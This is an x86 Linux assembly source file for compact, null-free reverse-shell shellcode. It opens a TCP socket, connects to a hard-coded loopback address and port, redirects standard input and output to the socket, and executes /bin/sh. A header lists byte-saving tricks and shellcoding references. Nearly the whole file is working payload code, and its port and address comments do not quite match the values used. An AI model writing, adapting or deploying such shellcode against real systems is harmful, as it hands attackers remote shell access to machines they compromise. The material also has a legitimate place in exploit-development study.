/* 
[*] reverse shell tcp/444 (adp, 2018)

   - intel syntax 
   - no 0x00
   - 75 bytes, without socketoptions
   - push/pop for init regs  
   - cdq to zero out edx by extending eax (edx = 0)
   - xchg to clean eax so we can use movb
   
[*] references: 

	https://www.abatchy.com/2017/04/shellcode-reduction-tips-x86
	https://modexp.wordpress.com/2017/06/07/x86-trix-one/
	http://tips-tricks-ideas.blogspot.com/2008/12/advanced-shellcoding-techniques.html
	http://programming4.us/security/706.aspx
*/

.global main

.text
main: 
        /*int socket(int domain, int type, int protocol) */
	pushl $102
	popl %eax
	cdq 	/* edx is now 0 */
	pushl $1
	popl %ebx
        pushl %edx               /* IPPROTO_IP = 0 */
        pushl $1                 /* SOCK_STREAM = 1 */
        pushl $2                 /* AF_INET = 2 */
	movl %esp, %ecx
        int $0x80              
	xchg %eax, %edi 
	
        /* connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) */
	pushl $102
	popl %eax	
	pushl $3
	popl %ebx
        pushl $0x0101017f       /* 127.0.0.1 */
        pushw $0x5c11           /* htons(4444) */
        pushw $2                /* PF_INET */
        movl %esp,%ecx          
        pushl $0x10             /* addrlen */
        pushl %ecx              /* &serv_addr */
        pushl %edi              /* sockfd */
        movl %esp,%ecx          /* arguments */
        int $0x80

	/* int dup2(int oldfd, int newfd) */
	movl %edi, %ebx /* fd goes to ebx */
	pushl $2
	popl %ecx

dup_syscall:

	pushl $63
	popl %eax
        int $0x80
        dec %ecx
        jns dup_syscall		

        /* int execve(const char *filename, char *const argv[], char *const envp[]) */
	pushl $11
	popl %eax	

	pushl %edx /* zero */
        pushl $0x68732f2f       # "//sh"
        pushl $0x6e69622f       # "/bin"
	pushl %esp
	popl %ebx
	movl %edx, %ecx # zero, null
        int $0x80               
